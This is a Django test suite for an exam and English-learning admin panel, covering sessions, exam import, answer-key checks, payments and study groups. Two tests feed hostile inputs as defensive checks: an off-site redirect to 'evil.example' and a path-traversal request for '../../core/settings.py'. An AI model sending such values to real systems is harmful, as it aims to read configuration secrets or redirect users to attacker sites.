import json

from django.test import TestCase
from django.urls import reverse
from django.utils import timezone

from learn.models import ApiToken, DailyXP, LearnerProfile, LessonProgress, Mistake
from users.models import User


class EnglishPanelTests(TestCase):
    def setUp(self):
        self.admin = User.objects.create_user('boss', password='pw', is_staff=True)
        self.student = User.objects.create_user('ali', password='pw', first_name='Ali')
        LearnerProfile.objects.create(user=self.student, level='A1', xp=40, streak=2, last_active=timezone.localdate())
        DailyXP.objects.create(user=self.student, date=timezone.localdate(), xp=40)
        LessonProgress.objects.create(user=self.student, lesson_slug='a1-hello', best_score=80, attempts=2)
        LessonProgress.objects.create(user=self.student, lesson_slug='story:a1-malikas-cat', best_score=100, attempts=1)
        Mistake.objects.create(user=self.student, lesson_slug='a1-hello', step_index=3)
        self.token = ApiToken.objects.create(user=self.student, key_hash='x' * 64, device='Samsung SM-A515F',
                                             platform='Android 14', app_version='1.2.0', ip='1.2.3.4')
        self.client.force_login(self.admin)

    def test_pages_need_staff(self):
        self.client.force_login(self.student)
        self.assertEqual(self.client.get(reverse('panel:english')).status_code, 302)

    def test_overview_learners_and_devices_render(self):
        overview = self.client.get(reverse('panel:english'))
        self.assertContains(overview, 'Tugallangan darslar')
        self.assertContains(overview, 'Hello! Nice to meet you')
        learners = self.client.get(reverse('panel:english_learners'), {'level': 'A1'})
        self.assertContains(learners, '@ali')
        self.assertContains(learners, 'Samsung SM-A515F')
        devices = self.client.get(reverse('panel:english_devices'), {'q': 'samsung'})
        self.assertContains(devices, 'Android 14')
        self.assertContains(self.client.get(reverse('panel:user_detail', args=[self.student.pk])), 'Ilova qurilmalari')

    def test_revoke_signs_the_device_out(self):
        resp = self.client.post(reverse('panel:english_device_revoke', args=[self.token.pk]), {'next': 'https://evil.example/'})
        self.assertRedirects(resp, reverse('panel:english_devices'), fetch_redirect_response=False)
        self.assertFalse(ApiToken.objects.exists())

    def test_login_sessions_combines_history_and_open_app_sessions(self):
        from users.models import LoginLog
        LoginLog.objects.create(user=self.student, username_attempt='ali', ip='1.2.3.4',
                                user_agent='Mozilla/5.0 Chrome', status='success')
        history = self.client.get(reverse('panel:login_sessions'))
        self.assertContains(history, 'Kirishlar va seanslar')
        self.assertContains(history, '1.2.3.4')
        sessions = self.client.get(reverse('panel:login_sessions'), {'tab': 'sessions'})
        self.assertContains(sessions, 'Samsung SM-A515F')
        self.assertContains(sessions, 'Mobil ilova')

    def test_staff_can_revoke_an_app_session(self):
        response = self.client.post(reverse('panel:session_revoke', args=['app', self.token.pk]))
        self.assertRedirects(response, reverse('panel:login_sessions'), fetch_redirect_response=False)
        self.assertFalse(ApiToken.objects.filter(pk=self.token.pk).exists())

    def test_current_staff_web_session_is_protected(self):
        key = self.client.session.session_key
        response = self.client.post(reverse('panel:session_revoke', args=['web', key]))
        self.assertRedirects(response, reverse('panel:login_sessions'), fetch_redirect_response=False)
        self.assertTrue(self.client.session.session_key)

    def test_publish_app_release(self):
        from django.core.files.uploadedfile import SimpleUploadedFile
        from learn.models import AppRelease
        apk = SimpleUploadedFile('app-release.apk', b'PK fake apk', content_type='application/vnd.android.package-archive')
        resp = self.client.post(reverse('panel:english_app'), {'version': '1.4.0', 'build': 6, 'apk': apk, 'notes': 'Yangi'})
        self.assertRedirects(resp, reverse('panel:english_app'))
        release = AppRelease.objects.get()
        self.assertTrue(release.apk.name.startswith('app/'))
        self.assertContains(self.client.get(reverse('panel:english_app')), '1.4.0')
        self.client.post(reverse('panel:english_app_delete', args=[release.pk]))
        self.assertFalse(AppRelease.objects.exists())


class ExamToolsPanelTests(TestCase):
    """Test import, question analysis, notes editor and the progress chart."""

    def setUp(self):
        import tempfile
        from django.test import override_settings
        from exams.models import Exam, Question, Section
        self.media = tempfile.TemporaryDirectory()
        self.override = override_settings(
            MEDIA_ROOT=self.media.name,
            STATICFILES_STORAGE='django.contrib.staticfiles.storage.StaticFilesStorage')
        self.override.enable()
        self.admin = User.objects.create_user('boss', password='pw', is_staff=True)
        self.client.force_login(self.admin)
        self.exam = Exam.objects.create(title='Panel tools', duration_minutes=60)
        self.section = Section.objects.create(exam=self.exam, title='Listening', section_type='listening', order=1)
        self.q = [Question.objects.create(section=self.section, order=n, question_type='gap_fill',
                                          correct_answer=ans, text=f'[Form] Complete.\nItem {n}: ___' if n == 1 else f'Item {n}: ___')
                  for n, ans in ((1, 'bed'), (2, 'post'), (3, 'airport'))]

    def tearDown(self):
        self.override.disable()
        self.media.cleanup()

    def test_import_lists_and_loads_a_seed_file(self):
        from exams.models import Exam
        page = self.client.get(reverse('panel:exam_import'))
        self.assertContains(page, 'ielts_full_mock_test_10.json')
        resp = self.client.post(reverse('panel:exam_import'), {'file': 'ielts_full_mock_test_10.json'})
        exam = Exam.objects.get(title='IELTS Full Mock Test 10')
        self.assertRedirects(resp, reverse('panel:exam_detail', args=[exam.pk]), fetch_redirect_response=False)
        self.assertEqual(exam.sections.get(order=1).questions.count(), 40)
        # only names from the listing are accepted
        self.client.post(reverse('panel:exam_import'), {'file': '../../core/settings.py'})
        self.assertEqual(Exam.objects.filter(title__startswith='IELTS').count(), 1)

    def test_analysis_flags_a_suspicious_key(self):
        from exams.models import UserAnswer, UserResult
        for i in range(6):
            student = User.objects.create_user(f's{i}', password='pw')
            result = UserResult.objects.create(user=student, exam=self.exam)
            # everyone writes "beds" for Q1 — the key is probably wrong
            for q, ans in zip(self.q, ('beds', 'post', '' if i < 2 else 'airport')):
                UserAnswer.objects.create(result=result, question=q, user_answer=ans)
        resp = self.client.get(reverse('panel:exam_analysis', args=[self.exam.pk]))
        self.assertEqual(resp.context['flagged'], 1)
        rows = resp.context['groups'][0]['rows']
        self.assertEqual((rows[0]['pct'], rows[0]['top_wrong']), (0, [('beds', 6)]))
        self.assertTrue(rows[0]['suspect'])
        self.assertEqual((rows[2]['right'], rows[2]['blank']), (4, 2))
        # fixing the key shows up straight away
        self.q[0].correct_answer = 'bed/beds'
        self.q[0].save()
        resp = self.client.get(reverse('panel:exam_analysis', args=[self.exam.pk]))
        self.assertEqual(resp.context['flagged'], 0)

    def test_notes_editor_saves_and_validates(self):
        url = reverse('panel:section_notes', args=[self.section.pk])
        self.assertContains(self.client.get(url), '[[1]]')
        resp = self.client.post(url, {'block': ['<p>Bed [[1]] and [[3]]</p>']})
        self.assertContains(resp, "ketma-ket")
        resp = self.client.post(url, {'block': ['<p>Bed [[9]]</p>']})
        self.assertContains(resp, "9 tartibli savol yo")
        self.client.post(url, {'block': ['<p>Bed [[1]] post [[2]]</p>', '']})
        self.section.refresh_from_db()
        self.assertEqual(self.section.extra_data['notes'], {'1': '<p>Bed [[1]] post [[2]]</p>'})
        self.client.post(url, {'block': ['']})
        self.section.refresh_from_db()
        self.assertNotIn('notes', self.section.extra_data)

    def test_user_progress_chart(self):
        from exams.models import UserResult
        student = User.objects.create_user('ali', password='pw')
        UserResult.objects.create(user=student, exam=self.exam, score=5.5, listening_score=6.0)
        UserResult.objects.create(user=student, exam=self.exam, score=6.5, listening_score=7.0, reading_score=6.5)
        resp = self.client.get(reverse('panel:user_detail', args=[student.pk]))
        self.assertContains(resp, 'progressChart')
        import json
        rows = json.loads(resp.context['progress_json'])
        self.assertEqual([r['l'] for r in rows], [6.0, 7.0])
        self.assertIsNone(rows[0]['r'])

    def test_dashboard_todo_links_to_pending_work(self):
        from exams.models import UserResult
        student = User.objects.create_user('vali', password='pw')
        UserResult.objects.create(user=student, exam=self.exam, status=UserResult.STATUS_PENDING)
        resp = self.client.get(reverse('panel:dashboard'))
        self.assertEqual(resp.context['todo']['pending_results'], 1)
        self.assertContains(resp, 'Writing baholash')
        self.assertContains(resp, f"{reverse('panel:result_grade', args=[UserResult.objects.get().pk])}")


class PanelWorkflowTests(TestCase):
    """Re-grading, audit log, key editing, groups, Telegram alerts, report."""

    def setUp(self):
        from exams.models import Exam, Question, Section
        self.admin = User.objects.create_superuser('boss', password='pw')
        self.client.force_login(self.admin)
        self.exam = Exam.objects.create(title='Workflow', duration_minutes=60)
        self.listening = Section.objects.create(exam=self.exam, title='Listening', section_type='listening', order=1)
        self.qs = [Question.objects.create(section=self.listening, order=n, question_type='gap_fill',
                                           correct_answer=ans, text=f'Item {n}: ___')
                   for n, ans in ((1, 'bed'), (2, 'post'))]
        self.reading = Section.objects.create(exam=self.exam, title='Reading', section_type='reading', order=2)
        self.yn = Question.objects.create(section=self.reading, order=41, question_type='tfng', correct_answer='NO',
                                          text='Claim', options=[{'key': k, 'text': k} for k in ('YES', 'NO', 'NOT GIVEN')])

    def _result(self, username, answers):
        from exams.views import create_result
        student = User.objects.create_user(username, password='pw')
        return create_result(student, self.exam, {str(q.id): a for q, a in answers})

    def test_regrade_after_key_fix(self):
        from core.models import AuditLog
        result = self._result('ali', [(self.qs[0], 'beds'), (self.qs[1], 'post'), (self.yn, 'YES')])
        self.assertFalse(result.answers.get(question=self.qs[0]).is_correct)
        old_listening = result.listening_score
        self.qs[0].correct_answer = 'bed/beds'
        self.qs[0].save()
        resp = self.client.post(reverse('panel:exam_regrade', args=[self.exam.pk]))
        self.assertRedirects(resp, reverse('panel:exam_analysis', args=[self.exam.pk]), fetch_redirect_response=False)
        result.refresh_from_db()
        self.assertTrue(result.answers.get(question=self.qs[0]).is_correct)
        self.assertGreater(result.listening_score, old_listening)
        self.assertEqual(AuditLog.objects.get().action, 'exam_regrade')

    def test_key_edit_keeps_yes_no_and_choose_two(self):
        from core.models import AuditLog
        from exams.models import Question
        url = reverse('panel:question_edit', args=[self.yn.pk])
        self.assertContains(self.client.get(url), 'value="yn:NO" selected')
        self.client.post(url, {'text': 'Claim', 'question_type': 'tfng', 'correct_answer_tfng': 'yn:YES'})
        self.yn.refresh_from_db()
        self.assertEqual(self.yn.correct_answer, 'YES')
        self.assertEqual([o['key'] for o in self.yn.options], ['YES', 'NO', 'NOT GIVEN'])
        log = AuditLog.objects.get(action='question_key')
        self.assertEqual(log.details, 'NO → YES')

        two = Question.objects.create(section=self.listening, order=3, question_type='mcq', correct_answer='C/E',
                                      text='Which TWO?', options=[{'key': k, 'text': k} for k in 'ABCDE'])
        resp = self.client.post(reverse('panel:question_edit', args=[two.pk]), {
            'text': 'Which TWO?', 'question_type': 'mcq', 'option_text': list('ABCDE'),
            'correct_option': '-1', 'correct_answer_multi': 'b / d'})
        self.assertEqual(resp.status_code, 302)
        two.refresh_from_db()
        self.assertEqual(two.correct_answer, 'B/D')

    def test_balance_change_is_logged_and_audit_page_is_superuser_only(self):
        import json
        from core.models import AuditLog
        student = User.objects.create_user('vali', password='pw')
        self.client.post(reverse('panel:user_balance', args=[student.pk]),
                         data=json.dumps({'amount': 50000, 'note': 'naqd'}), content_type='application/json')
        entry = AuditLog.objects.get(action='balance')
        self.assertIn('+50,000', entry.details)
        self.assertEqual(entry.staff, self.admin)
        self.assertContains(self.client.get(reverse('system:staff_audit')), "Balans o&#x27;zgartirildi")
        staff = User.objects.create_user('helper', password='pw', is_staff=True)
        self.client.force_login(staff)
        # Lives in /system/ now — superusers only.
        resp = self.client.get(reverse('system:staff_audit'))
        self.assertEqual(resp.status_code, 302)
        self.assertTrue(resp.url.startswith('/login/'))

    def test_groups_members_and_filters(self):
        from users.models import StudyGroup
        self.client.post(reverse('panel:groups'), {'name': 'Ertalabki'})
        group = StudyGroup.objects.get()
        ali = User.objects.create_user('ali', password='pw', first_name='Ali')
        vali = User.objects.create_user('vali', password='pw')
        self.assertEqual(self.client.get(reverse('panel:group_member_search', args=[group.pk]), {'q': 'ali'}).json()['users'][0]['id'], ali.pk)
        self.client.post(reverse('panel:group_detail', args=[group.pk]), {'action': 'add', 'user_id': ali.pk})
        self.assertEqual(list(group.members.all()), [ali])
        self._result('x', [])  # someone outside the group
        from exams.views import create_result
        create_result(ali, self.exam, {str(self.qs[0].id): 'bed'})
        resp = self.client.get(reverse('panel:results'), {'group': group.pk})
        self.assertEqual([r.user for r in resp.context['results']], [ali])
        page = self.client.get(reverse('panel:group_detail', args=[group.pk]))
        self.assertEqual(page.context['rows'][0]['user'], ali)
        import json
        self.client.post(reverse('panel:users_bulk'), data=json.dumps({'action': 'add_group', 'ids': [vali.pk], 'group': group.pk}),
                         content_type='application/json')
        self.assertEqual(group.members.count(), 2)
        self.client.post(reverse('panel:group_detail', args=[group.pk]),
                         {'action': 'remove', 'user_id': ali.pk, 'back': reverse('panel:user_detail', args=[ali.pk])})
        self.assertEqual(group.members.count(), 1)

    def test_telegram_alerts(self):
        from unittest import mock
        from exams.models import Section, Question
        writing = Section.objects.create(exam=self.exam, title='Writing', section_type='writing', order=3)
        task = Question.objects.create(section=writing, order=81, question_type='writing_task', text='Essay')
        with mock.patch('core.utils.notify_admins') as tg:
            self._result('w1', [(task, 'my essay')])
        self.assertIn('Writing baholash kerak', tg.call_args[0][0])
        # five students all answer Q1 "beds" → the key "bed" looks wrong
        with mock.patch('core.utils.notify_admins') as tg:
            for i in range(5):
                self._result(f's{i}', [(self.qs[0], 'beds'), (self.qs[1], 'post')])
        alerts = [c[0][0] for c in tg.call_args_list if 'Kalitni tekshiring' in c[0][0]]
        self.assertEqual(len(alerts), 1)
        self.assertIn('beds', alerts[0])

    def test_progress_report(self):
        from exams.views import create_result
        ali = User.objects.create_user('ali', password='pw', first_name='Ali')
        create_result(ali, self.exam, {str(self.qs[0].id): 'bed', str(self.yn.id): 'YES'})
        create_result(ali, self.exam, {str(self.qs[0].id): 'bed', str(self.qs[1].id): 'post', str(self.yn.id): 'NO'})
        resp = self.client.get(reverse('panel:user_report', args=[ali.pk]))
        self.assertContains(resp, 'IELTS progress hisoboti')
        self.assertEqual(len(resp.context['results']), 2)
        self.assertGreater(resp.context['change'], 0)


class AnswerReviewTests(TestCase):
    """Grade page shows every Listening/Reading question with the student's
    answer next to the key, so staff see where and how they went wrong."""

    def test_wrong_and_blank_answers_are_listed_with_the_key(self):
        from exams.models import Exam, Question, Section, UserAnswer, UserResult
        from exams.views import create_result

        admin = User.objects.create_user('boss', password='pw', is_staff=True)
        student = User.objects.create_user('ali', password='pw')
        exam = Exam.objects.create(title='Mock')
        reading = Section.objects.create(exam=exam, title='Reading', section_type='reading')
        q1 = Question.objects.create(section=reading, order=1, question_type='mcq', correct_answer='B',
                                     text='[Passage 1] Choose the correct letter.\nWhat does the writer think?',
                                     options=[{'key': 'A', 'text': 'cities grow'}, {'key': 'B', 'text': 'rivers matter'}])
        q2 = Question.objects.create(section=reading, order=2, question_type='gap_fill', text='Plants need ___.',
                                     correct_answer='sunlight', explanation='Paragraph C, line 3')
        q3 = Question.objects.create(section=reading, order=3, question_type='tfng', text='Bees sleep.',
                                     correct_answer='TRUE')
        result = create_result(student, exam, {str(q1.id): 'A', str(q2.id): '', str(q3.id): 'TRUE'})
        self.assertEqual(UserAnswer.objects.filter(result=result).count(), 3)

        self.client.force_login(admin)
        page = self.client.get(reverse('panel:result_grade', args=[result.pk]))
        reading_stats = page.context['objective'][0]
        self.assertEqual((reading_stats['correct'], reading_stats['wrong'], reading_stats['empty']), (1, 1, 1))
        self.assertEqual(reading_stats['items'][0]['part'], 'Passage 1')
        self.assertContains(page, 'What does the writer think?')
        self.assertContains(page, 'cities grow')    # what the student picked
        self.assertContains(page, 'rivers matter')  # the right option
        self.assertContains(page, 'sunlight')
        self.assertContains(page, 'Paragraph C, line 3')
        self.assertContains(page, "— bo'sh")
        self.assertIsInstance(result, UserResult)


class SystemMovedPagesTests(TestCase):
    """Security logs, staff audit, notifications, promo codes and site
    settings moved from /panel/ to /system/ (superusers only)."""

    def test_pages_live_in_system_panel_only(self):
        boss = User.objects.create_user('boss', password='pw', is_staff=True, is_superuser=True)
        helper = User.objects.create_user('helper', password='pw', is_staff=True)
        self.client.force_login(boss)
        panel_home = self.client.get(reverse('panel:dashboard'))
        for name in ('security', 'staff_audit', 'notifications', 'promocodes', 'settings'):
            url = reverse(f'system:{name}')
            self.assertEqual(self.client.get(url).status_code, 200, name)
            self.assertNotContains(panel_home, f'href="{url}"')
        self.assertContains(self.client.get(reverse('system:dashboard')), reverse('system:promocodes'))
        self.assertRedirects(self.client.get('/panel/promocodes/'), reverse('system:promocodes'),
                             fetch_redirect_response=False)
        self.client.post(reverse('system:promocodes'), {'code': 'yoz26', 'max_uses': '3'})
        from core.models import PromoCode
        self.assertTrue(PromoCode.objects.filter(code='YOZ26').exists())

        self.client.force_login(helper)
        self.assertEqual(self.client.get(reverse('system:promocodes')).status_code, 302)
        self.assertNotContains(self.client.get(reverse('panel:dashboard')), 'Tizim</a>')


class PanelListTests(TestCase):
    """Paging, filters and CSV exports on the users/results/payments lists."""

    def setUp(self):
        from exams.models import Exam, UserResult
        from payments.models import Transaction
        self.admin = User.objects.create_superuser('boss', password='pw')
        self.client.force_login(self.admin)
        self.students = [User.objects.create_user(f's{i}', password='pw', first_name=f'Talaba{i}') for i in range(60)]
        self.blocked = User.objects.create_user('blok', password='pw', first_name='Bloklangan', is_active=False)
        self.exam = Exam.objects.create(title='Cambridge 17')
        self.other_exam = Exam.objects.create(title='Boshqa test')
        for student in self.students:
            UserResult.objects.create(user=student, exam=self.exam, score=6)
        UserResult.objects.create(user=self.blocked, exam=self.other_exam, score=7)
        Transaction.objects.create(user=self.blocked, amount=1000, status='success')
        Transaction.objects.create(user=self.blocked, amount=300, status='pending')
        self.pending_tx = Transaction.objects.create(user=self.students[0], amount=200, status='pending')

    def test_users_are_paged(self):
        first = self.client.get(reverse('panel:users'))
        self.assertEqual(len(first.context['users']), 50)
        self.assertEqual(first.context['page'].paginator.count, 62)
        self.assertEqual(len(self.client.get(reverse('panel:users'), {'page': 2}).context['users']), 12)

    def test_page_links_keep_the_filters(self):
        resp = self.client.get(reverse('panel:users'), {'q': 'Talaba', 'filter': 'student', 'page': 1})
        self.assertContains(resp, '?q=Talaba&amp;filter=student&amp;page=2')
        # Switching a filter keeps the search but goes back to page 1.
        self.assertContains(resp, 'href="?q=Talaba&amp;filter=staff"')

    def test_users_csv_follows_the_filter(self):
        body = self.client.get(reverse('panel:users_export'), {'filter': 'inactive'}).content.decode('utf-8-sig')
        self.assertEqual(len(body.strip().splitlines()), 2)
        self.assertIn('blok', body)

    def test_results_search_page_and_csv(self):
        self.assertEqual(self.client.get(reverse('panel:results')).context['page'].paginator.count, 61)
        found = self.client.get(reverse('panel:results'), {'q': 'Bloklangan'})
        self.assertEqual(found.context['page'].paginator.count, 1)
        by_exam = self.client.get(reverse('panel:results'), {'q': 'Boshqa'})
        self.assertEqual(by_exam.context['page'].paginator.count, 1)
        body = self.client.get(reverse('panel:results_export'), {'exam': self.other_exam.pk}).content.decode('utf-8-sig')
        self.assertEqual(len(body.strip().splitlines()), 2)

    def test_bad_exam_filter_is_ignored(self):
        self.assertEqual(self.client.get(reverse('panel:results'), {'exam': 'abc'}).status_code, 200)

    def test_transaction_totals(self):
        everything = self.client.get(reverse('panel:transactions'))
        self.assertEqual(everything.context['total'], 1000)  # money received only
        pending = self.client.get(reverse('panel:transactions'), {'status': 'pending'})
        self.assertEqual(pending.context['total'], 500)
        mine = self.client.get(reverse('panel:transactions'), {'q': 'Bloklangan'})
        self.assertEqual(mine.context['page'].paginator.count, 2)

    def test_deciding_a_payment_twice_keeps_the_first_decision(self):
        approve = reverse('panel:tx_approve', args=[self.pending_tx.pk])
        reject = reverse('panel:tx_reject', args=[self.pending_tx.pk])
        self.assertEqual(self.client.post(approve).json()['status'], 'success')
        self.assertEqual(self.client.post(reject).json()['status'], 'success')
        self.students[0].refresh_from_db()
        self.assertEqual(self.students[0].balance, 200)

    def test_money_format(self):
        from panel.templatetags.panel_ui import som
        self.assertEqual(som('2200000.00'), '2 200 000')
        self.assertEqual(som(None), '0')


class ExamPasswordsPlaceTests(TestCase):
    def test_passwords_open_from_the_exams_page_not_the_menu(self):
        self.client.force_login(User.objects.create_user('boss', password='pw', is_staff=True))
        url = reverse('panel:exam_passwords')
        exams = self.client.get(reverse('panel:exams')).content.decode()
        self.assertEqual(exams.count(f'href="{url}"'), 1)  # the button, and no menu link
        self.assertContains(self.client.get(url), 'Test parollari')


class DropSuperuserTests(TestCase):
    def setUp(self):
        self.boss = User.objects.create_superuser('boss', password='pw')
        self.other = User.objects.create_superuser('zufar', password='pw')
        self.client.force_login(self.boss)

    def _drop(self, user):
        return self.client.post(reverse('panel:user_drop_superuser', args=[user.pk]))

    def test_superuser_becomes_plain_admin(self):
        self.assertTrue(self._drop(self.other).json()['ok'])
        self.other.refresh_from_db()
        self.assertFalse(self.other.is_superuser)
        self.assertTrue(self.other.is_staff)
        self.client.force_login(self.other)
        self.assertEqual(self.client.get(reverse('panel:dashboard')).status_code, 200)
        self.assertNotEqual(self.client.get(reverse('system:dashboard')).status_code, 200)

    def test_cannot_drop_yourself(self):
        self.assertEqual(self._drop(self.boss).status_code, 400)
        self.boss.refresh_from_db()
        self.assertTrue(self.boss.is_superuser)

    def test_plain_admin_cannot_do_it(self):
        admin = User.objects.create_user('admin1', password='pw', is_staff=True)
        self.client.force_login(admin)
        self.assertEqual(self._drop(self.other).status_code, 403)
        self.other.refresh_from_db()
        self.assertTrue(self.other.is_superuser)

    def test_button_shows_only_for_another_superuser(self):
        self.assertContains(self.client.get(reverse('panel:user_detail', args=[self.other.pk])), 'Oddiy admin qilish')
        self.assertNotContains(self.client.get(reverse('panel:user_detail', args=[self.boss.pk])), 'Oddiy admin qilish')

    def test_make_staff_cannot_lock_a_superuser_out(self):
        self.assertEqual(self.client.post(reverse('panel:user_make_staff', args=[self.other.pk])).status_code, 400)
        self.other.refresh_from_db()
        self.assertTrue(self.other.is_staff)


class TransactionPanelTests(TestCase):
    def setUp(self):
        from django.core.cache import cache
        from payments.models import PremiumPurchase, Transaction
        cache.clear()
        self.Transaction = Transaction
        self.boss = User.objects.create_superuser('boss', password='pw', first_name='Bosh')
        self.ali = User.objects.create_user('ali', password='pw', first_name='Ali', phone_number='+998901112233')
        self.vali = User.objects.create_user('vali', password='pw', first_name='Vali')
        self.a = Transaction.objects.create(user=self.ali, amount=50000, method='manual', status='pending')
        self.b = Transaction.objects.create(user=self.vali, amount=20000, method='click', status='pending')
        self.c = Transaction.objects.create(user=self.vali, amount=70000, method='payme', status='success')
        PremiumPurchase.objects.create(user=self.ali, amount=99000, days=30)
        self.client.force_login(self.boss)

    def _balance(self, user):
        user.refresh_from_db()
        return user.balance

    def test_stats_cards(self):
        stats = self.client.get(reverse('panel:transactions')).context['stats']
        self.assertEqual((stats['today'], stats['month'], stats['pending_count'], stats['pending_sum']), (70000, 70000, 2, 70000))
        self.assertEqual((stats['premium_count'], stats['premium_sum']), (1, 99000))

    def test_filters_by_method_and_date(self):
        url = reverse('panel:transactions')
        self.assertEqual(self.client.get(url, {'method': 'click'}).context['page'].paginator.count, 1)
        self.assertEqual(self.client.get(url, {'from': '2000-01-01', 'to': '2000-01-02'}).context['page'].paginator.count, 0)
        today = timezone.localdate().isoformat()
        self.assertEqual(self.client.get(url, {'from': today, 'to': today}).context['page'].paginator.count, 3)
        self.assertEqual(self.client.get(url, {'from': 'not-a-date'}).status_code, 200)

    def test_csv_follows_the_filters(self):
        body = self.client.get(reverse('panel:transactions_export'), {'method': 'click'}).content.decode('utf-8-sig')
        self.assertEqual(len(body.strip().splitlines()), 2)
        self.assertIn('Vali', body)

    def test_approve_records_who_and_tells_the_student(self):
        from chat.models import ChatMessage
        self.client.post(reverse('panel:tx_approve', args=[self.a.pk]))
        self.a.refresh_from_db()
        self.assertEqual(self.a.decided_by, self.boss)
        self.assertIsNotNone(self.a.decided_at)
        self.assertEqual(self._balance(self.ali), 50000)
        message = ChatMessage.objects.filter(support__user=self.ali).latest('pk')
        self.assertTrue(message.is_auto)
        self.assertIn("50 000 so'm", message.text)

    def test_reject_reason_reaches_the_student(self):
        from chat.models import ChatMessage
        self.client.post(reverse('panel:tx_reject', args=[self.a.pk]), {'reason': "To'lov topilmadi"})
        self.a.refresh_from_db()
        self.assertEqual((self.a.status, self.a.reject_reason), ('failed', "To'lov topilmadi"))
        self.assertEqual(self._balance(self.ali), 0)
        self.assertIn("Sabab: To'lov topilmadi", ChatMessage.objects.filter(support__user=self.ali).latest('pk').text)
        self.assertContains(self.client.get(reverse('panel:transactions')), "To&#x27;lov topilmadi")

    def test_bulk_approves_pending_only_and_once(self):
        url = reverse('panel:transactions_bulk')
        ids = [self.a.pk, self.b.pk, self.c.pk, 99999]
        body = json.dumps({'ids': ids, 'action': 'approve'})
        self.assertEqual(self.client.post(url, body, content_type='application/json').json()['count'], 2)
        self.assertEqual(self.client.post(url, body, content_type='application/json').json()['count'], 0)
        self.assertEqual(self._balance(self.ali), 50000)
        self.assertEqual(self._balance(self.vali), 20000)

    def test_bulk_reject_keeps_balances(self):
        body = json.dumps({'ids': [self.a.pk], 'action': 'reject', 'reason': 'Xato'})
        self.client.post(reverse('panel:transactions_bulk'), body, content_type='application/json')
        self.assertEqual(self._balance(self.ali), 0)

    def test_students_cannot_decide_or_export(self):
        self.client.force_login(self.ali)
        self.assertEqual(self.client.post(reverse('panel:tx_approve', args=[self.a.pk])).status_code, 302)
        self.assertEqual(self.client.get(reverse('panel:transactions_export')).status_code, 302)
        body = json.dumps({'ids': [self.a.pk], 'action': 'approve'})
        self.assertEqual(self.client.post(reverse('panel:transactions_bulk'), body, content_type='application/json').status_code, 302)
        self.assertEqual(self._balance(self.ali), 0)

    def test_premium_tab(self):
        page = self.client.get(reverse('panel:transactions'), {'status': 'premium'})
        self.assertContains(page, 'Sotib olingan')
        self.assertContains(page, "99\u00a0000 so'm")

    def test_missing_payment_is_404(self):
        self.assertEqual(self.client.post(reverse('panel:tx_approve', args=[99999])).status_code, 404)


class GroupPageTests(TestCase):
    def setUp(self):
        from datetime import timedelta
        from django.core.cache import cache
        from exams.models import Exam, UserResult
        from users.models import StudyGroup
        cache.clear()
        self.UserResult = UserResult
        self.boss = User.objects.create_superuser('boss', password='pw')
        self.ali = User.objects.create_user('ali', password='pw', first_name='Ali', phone_number='+998901112233')
        self.vali = User.objects.create_user('vali', password='pw', first_name='Vali')
        self.outsider = User.objects.create_user('tashqi', password='pw', first_name='Tashqi')
        self.group = StudyGroup.objects.create(name='Ertalabki guruh')
        self.group.members.add(self.ali, self.vali)
        self.exam = Exam.objects.create(title='Mock 1')
        old = UserResult.objects.create(user=self.ali, exam=self.exam, score=5.5, listening_score=6, reading_score=7, writing_score=4)
        UserResult.objects.filter(pk=old.pk).update(completed_at=timezone.now() - timedelta(days=30))
        UserResult.objects.create(user=self.ali, exam=self.exam, score=7, listening_score=8, reading_score=7, writing_score=5)
        self.client.force_login(self.boss)

    def _page(self):
        return self.client.get(reverse('panel:group_detail', args=[self.group.pk]))

    def test_group_logo(self):
        self.assertEqual(self.group.initials, 'EG')

    def test_list_shows_members_and_activity(self):
        page = self.client.get(reverse('panel:groups'))
        self.assertContains(page, 'Ertalabki guruh')
        group = page.context['groups'][0]
        self.assertEqual((group.member_count, group.active_week), (2, 1))

    def test_rows_show_change_and_inactive_members(self):
        rows = {r['user'].pk: r for r in self._page().context['rows']}
        self.assertEqual(rows[self.ali.pk]['delta'], 1.5)
        self.assertFalse(rows[self.ali.pk]['inactive'])
        self.assertIsNone(rows[self.vali.pk]['delta'])
        self.assertTrue(rows[self.vali.pk]['inactive'])

    def test_weakest_skill_is_marked(self):
        skills = {k['label']: k for k in self._page().context['skills']}
        self.assertTrue(skills['Writing']['weak'])
        self.assertFalse(skills['Reading']['weak'])
        self.assertNotIn('Speaking', skills)  # nobody took it

    def test_group_message_reaches_members_only(self):
        from chat.models import ChatMessage
        self.client.post(reverse('panel:group_detail', args=[self.group.pk]), {'action': 'message', 'text': 'Ertaga mock'})
        self.assertEqual(ChatMessage.objects.filter(text='Ertaga mock').count(), 2)
        self.assertFalse(ChatMessage.objects.filter(text='Ertaga mock', support__user=self.outsider).exists())

    def test_empty_group_message_is_refused(self):
        from chat.models import ChatMessage
        before = ChatMessage.objects.count()
        self.client.post(reverse('panel:group_detail', args=[self.group.pk]), {'action': 'message', 'text': '  '})
        self.assertEqual(ChatMessage.objects.count(), before)

    def test_csv(self):
        body = self.client.get(reverse('panel:group_export', args=[self.group.pk])).content.decode('utf-8-sig')
        self.assertIn('Ali', body)
        self.assertEqual(len(body.strip().splitlines()), 3)

    def test_students_cannot_message_or_export(self):
        from chat.models import ChatMessage
        self.client.force_login(self.ali)
        self.client.post(reverse('panel:group_detail', args=[self.group.pk]), {'action': 'message', 'text': 'x'})
        self.assertFalse(ChatMessage.objects.filter(text='x').exists())
        self.assertEqual(self.client.get(reverse('panel:group_export', args=[self.group.pk])).status_code, 302)


class UserProfilePageTests(TestCase):
    def setUp(self):
        from datetime import timedelta
        from django.core.cache import cache
        from exams.models import Exam, UserResult
        from payments.models import Transaction
        cache.clear()
        self.boss = User.objects.create_superuser('boss', password='pw')
        self.ali = User.objects.create_user('ali', password='pw', first_name='Ali')
        exam = Exam.objects.create(title='Mock 1')
        old = UserResult.objects.create(user=self.ali, exam=exam, score=5.5, listening_score=6, writing_score=4)
        UserResult.objects.filter(pk=old.pk).update(completed_at=timezone.now() - timedelta(days=30))
        UserResult.objects.create(user=self.ali, exam=exam, score=7, listening_score=8, writing_score=5)
        Transaction.objects.create(user=self.ali, amount=50000, status='success')
        Transaction.objects.create(user=self.ali, amount=90000, status='failed')
        self.client.force_login(self.boss)

    def _page(self, user=None):
        return self.client.get(reverse('panel:user_detail', args=[(user or self.ali).pk]))

    def test_headline_numbers(self):
        page = self._page()
        self.assertEqual(page.context['last_result'].score, 7)
        self.assertEqual(page.context['band_change'], 1.5)
        self.assertEqual(page.context['stats']['best'], 7)
        self.assertEqual(page.context['paid_total'], 50000)

    def test_skills_mark_the_weakest(self):
